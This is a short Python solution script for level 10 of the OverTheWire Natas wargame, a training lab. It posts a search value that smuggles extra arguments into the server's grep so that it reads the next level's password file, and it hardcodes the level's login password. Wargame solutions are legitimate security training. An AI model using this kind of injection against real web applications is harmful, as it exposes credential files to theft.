#!  usr/bin/env python
import requests
username="natas10"
password="nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://%s.natas.labs.overthewire.org/" % username
session = requests.Session()
posst  = {"needle" : ". /etc/natas_webpass/natas11 #" , "submit" :"Search"}
# response = session.post(url , auth = (username , password),cookies = cook)
response = session.post(url ,data = posst , auth = (username , password))
# response = session.get(url , params=get,auth = (username , password))
# response = session.get(url , auth = (username , password))

# print session.headers

# print ("\n")

# print session.cookies
print (response.text)
